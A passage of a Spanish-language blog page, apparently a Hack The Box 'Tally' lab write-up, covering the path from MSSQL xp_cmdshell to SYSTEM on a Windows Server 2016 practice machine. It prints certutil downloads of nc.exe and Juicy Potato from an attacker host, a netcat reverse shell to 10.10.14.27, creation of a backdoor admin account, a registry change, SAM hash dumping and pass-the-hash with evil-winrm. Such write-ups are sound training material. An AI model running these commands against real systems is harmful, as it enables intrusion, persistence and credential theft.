+Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
+<span class="o">(</span><span class="k">return </span>status <span class="o">=</span> 0<span class="o">)</span>
+1&gt; reconfigure
+2&gt; go
+1&gt;
+</code></pre></div></div>
+
+<p>Y ahora si vamos a tratar de habilitar <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; sp_configure <span class="s2">"xp_cmdshell"</span>, 1
+2&gt; go
+Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
+<span class="o">(</span><span class="k">return </span>status <span class="o">=</span> 0<span class="o">)</span>
+1&gt; reconfigure
+2&gt; go
+1&gt; xp_cmdshell <span class="s2">"whoami"</span>
+2&gt; go
+
+        output                                                                     
+        <span class="nt">-------------------------------------------------------------------------------------------------------------------------</span>
+<span class="nt">---------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="nt">---------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="nt">---------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="nt">----</span>
+        tally<span class="se">\s</span>arah                                                               
+        NULL                                                                       
+<span class="o">(</span>2 rows affected, <span class="k">return </span>status <span class="o">=</span> 0<span class="o">)</span>
+1&gt; 
+</code></pre></div></div>
+
+<p>Ya tenemos ejecución de comando y vemos que estamos como el usuario <strong>sarah</strong>. Cabe mencionar que es posible que el componente se vuela a deshabilitar, asi que hay que seguir el mismo proceso anterior para habilitarlo. Ahora lo que nos queda es entablarnos una reverse shell, para este caso vamos a transferir el binario nc.exe haciendo uso de un servidor HTTP con python:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; xp_cmdshell <span class="s2">"certutil.exe -f -urlcache -split http://10.10.14.27/nc.exe C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">c.exe"</span>                               
+2&gt; go                      
+        output                                                            
+        <span class="nt">-------------------------------------------------------------------------------------------------------------------------</span>
+<span class="nt">---------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="nt">---------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="nt">---------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="nt">----</span>                                                                                                
+        <span class="k">****</span>  Online  <span class="k">****</span>                 
+          0000  ...
+          6e00                                                                     
+        CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.                       
+        NULL                                                                       
+<span class="o">(</span>5 rows affected, <span class="k">return </span>status <span class="o">=</span> 0<span class="o">)</span>
+1&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.59 - - <span class="o">[</span>19/Nov/2021 12:50:41] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
+10.10.10.59 - - <span class="o">[</span>19/Nov/2021 12:50:41] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<p>Y ahora nos entablamos la conexión:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; xp_cmdshell <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">c.exe -e cmd.exe 10.10.14.27 443"</span>
+2&gt; go
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.59] 49936
+Microsoft Windows <span class="o">[</span>Version 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>tally<span class="se">\s</span>arah
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Ahora solo nos queda escalar privilegios, por lo que vamos a enumerar un poco el sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\S</span>arah<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                               State   
+<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
+
+C:<span class="se">\U</span>sers<span class="se">\S</span>arah<span class="se">\D</span>esktop&gt;
+
+</code></pre></div></div>
+
+<p>Vemos que tenemos el privilegio <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> habilitado, por lo que ya debemos estar pensando en un <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1"><strong><em>Juicy Potato</em></strong></a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\S</span>arah<span class="se">\D</span>esktop&gt; <span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">mkdir </span>Privesc
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">cd </span>Privesc
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.27/JuicyPotato.exe JP.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  000000  ...
+  054e00
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.27/nc.exe nc.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  0000  ...
+  6e00
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.59 - - <span class="o">[</span>19/Nov/2021 12:57:47] <span class="s2">"GET /JuicyPotato.exe HTTP/1.1"</span> 200 -
+10.10.10.59 - - <span class="o">[</span>19/Nov/2021 12:57:50] <span class="s2">"GET /JuicyPotato.exe HTTP/1.1"</span> 200 -
+10.10.10.59 - - <span class="o">[</span>19/Nov/2021 13:05:02] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
+10.10.10.59 - - <span class="o">[</span>19/Nov/2021 13:05:09] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<p>Ahora nos entablamos una reverse shell a nuestra máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="k">****</span>JP.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-l</span> 4444 <span class="nt">-a</span> <span class="s2">"/c C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\P</span><span class="s2">rivesc</span><span class="se">\n</span><span class="s2">c.exe -e cmd.exe 10.10.14.27 443"</span>
+JP.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-l</span> 4444 <span class="nt">-a</span> <span class="s2">"/c C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\P</span><span class="s2">rivesc</span><span class="se">\n</span><span class="s2">c.exe -e cmd.exe 10.10.14.27 443"</span>
+Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 4444
+......
+<span class="o">[</span>+] authresult 0
+<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM
+
+<span class="o">[</span>+] CreateProcessWithTokenW OK
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.59] 50135
+Microsoft Windows <span class="o">[</span>Version 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> y podemos  visualizar la flag (root.txt).</p>
+
+<p>Otra forma que podriamos utilizar sería crearno un usuario y agregarlo al grupo <strong>Administrators</strong> (<strong>Nota</strong>: A veces es necesario ejecutar el mismo comando varias veces para que aplique y el nombre de usuario no debe contener digitos).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; JP.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-l</span> 4444 <span class="nt">-a</span> <span class="s2">"/c net user kamiyo k4miyo123 /add"</span>
+
+Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 4444
+......
+<span class="o">[</span>+] authresult 0
+<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM
+
+<span class="o">[</span>+] CreateProcessWithTokenW OK
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; JP.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-l</span> 4444 <span class="nt">-a</span> <span class="s2">"/c net localgroup Administrators k4miyo /add"</span>
+
+Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 4444
+......
+<span class="o">[</span>+] authresult 0
+<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM
+
+<span class="o">[</span>+] CreateProcessWithTokenW OK
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>Lo podemos validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.59 <span class="nt">-u</span> <span class="s1">'kamiyo'</span> <span class="nt">-p</span> <span class="s1">'k4miyo123!'</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:TALLY<span class="o">)</span> <span class="o">(</span>domain:TALLY<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span>+] TALLY<span class="se">\k</span>amiyo:k4miyo123!
+</code></pre></div></div>
+
+<p>Vemos que no tenemos un <code class="language-plaintext highlighter-rouge">Pwn3d!</code>, así que vamos a retocar un registro del sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; JP.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-l</span> 4444 <span class="nt">-a</span> <span class="s2">"/c reg add HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\C</span><span class="s2">urrentVersion</span><span class="se">\P</span><span class="s2">olicies</span><span class="se">\S</span><span class="s2">ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"</span>
+Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 4444
+......
+<span class="o">[</span>+] authresult 0
+<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM
+
+<span class="o">[</span>+] CreateProcessWithTokenW OK
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.59 <span class="nt">-u</span> <span class="s1">'kamiyo'</span> <span class="nt">-p</span> <span class="s1">'k4miyo123!'</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:TALLY<span class="o">)</span> <span class="o">(</span>domain:TALLY<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span>+] TALLY<span class="se">\k</span>amiyo:k4miyo123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Ya tenemos un <code class="language-plaintext highlighter-rouge">Pwn3d!</code>, así que podriamos tratar de ver los hashes de los usuarios, en concreto del administrador:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.59 <span class="nt">-u</span> <span class="s1">'kamiyo'</span> <span class="nt">-p</span> <span class="s1">'k4miyo123!'</span> <span class="nt">--sam</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:TALLY<span class="o">)</span> <span class="o">(</span>domain:TALLY<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span>+] TALLY<span class="se">\k</span>amiyo:k4miyo123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span>+] Dumping SAM hashes
+SMB         10.10.10.59     445    TALLY            Administrator:500:aad3b435b51404eeaad3b435b51404ee:d904afc137554b20156f689f1b19c2b2:::
+SMB         10.10.10.59     445    TALLY            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.59     445    TALLY            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+^CKeyboardInterrupt
+2021-11-19T19:45:05Z
+</code></pre></div></div>
+
+<p>Y ahora podemos hacer <strong><em>pass the hash</em></strong> como el usuario <strong>Administrator</strong> y la herramienta <code class="language-plaintext highlighter-rouge">evil-winrm</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-u</span> <span class="s2">"Administrator"</span> <span class="nt">-H</span> <span class="s2">"d904afc137554b20156f689f1b19c2b2"</span> <span class="nt">-i</span> 10.10.10.59
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>tally<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<p>Ya somo el usuario <strong>Administrator</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#c" class="page__taxonomy-item" rel="tag">C</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#patch-management" class="page__taxonomy-item" rel="tag">Patch Management</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sql" class="page__taxonomy-item" rel="tag">SQL</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hard" class="page__taxonomy-item" rel="tag">Hard</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-11-26T00:00:00-06:00">November 26, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-solidstate/" class="pagination--pager" title="Hack The Box SolidState
+">Previous</a>
+    
+    
+      <a href="/portScan/" class="pagination--pager" title="Archivo portScan
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
